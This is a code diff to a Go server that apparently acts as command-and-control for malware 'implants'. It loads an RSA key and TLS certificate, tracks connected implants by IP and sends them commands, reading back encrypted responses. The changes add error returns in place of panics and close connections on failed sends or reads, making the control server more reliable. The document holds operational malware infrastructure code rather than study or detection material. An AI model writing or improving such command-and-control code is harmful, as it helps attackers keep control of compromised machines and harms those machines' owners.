@@ -28,7 +28,10 @@ var privateKey *rsa.PrivateKey
 
 func main() {
 	baseDir := getBaseDir()
-	loadPrivateKey(filepath.Join(baseDir, "certs", "rsa_private.pem"))
+	if err := loadPrivateKey(filepath.Join(baseDir, "certs", "rsa_private.pem")); err != nil {
+		fmt.Println("[-]", err)
+		return
+	}
 	initDB()
 
 	cert, err := tls.LoadX509KeyPair(
@@ -56,21 +59,22 @@ func main() {
 	}
 }
 
-func loadPrivateKey(path string) {
+func loadPrivateKey(path string) error {
 	keyData, err := os.ReadFile(path)
 	if err != nil {
-		panic(err)
+		return fmt.Errorf("read private key: %w", err)
 	}
 
 	block, _ := pem.Decode(keyData)
 	if block == nil {
-		panic("[-] Failed to decode RSA private key")
+		return fmt.Errorf("failed to decode RSA private key")
 	}
 
 	privateKey, err = x509.ParsePKCS1PrivateKey(block.Bytes)
 	if err != nil {
-		panic(err)
+		return fmt.Errorf("parse private key: %w", err)
 	}
+	return nil
 }
 
 func initDB() {
@@ -182,6 +186,7 @@ func sendCommand(ip, command string) {
 	_, err := conn.Write([]byte(command + "\n"))
 	if err != nil {
 		fmt.Println("[-] Failed to send command")
+		conn.Close()
 		mutex.Lock()
 		delete(implants, ip)
 		mutex.Unlock()
@@ -192,6 +197,7 @@ func sendCommand(ip, command string) {
 	encResp, err := reader.ReadString('\n')
 	if err != nil {
 		fmt.Println("[-] Failed to read response")
+		conn.Close()
 		mutex.Lock()
 		delete(implants, ip)
 		mutex.Unlock()
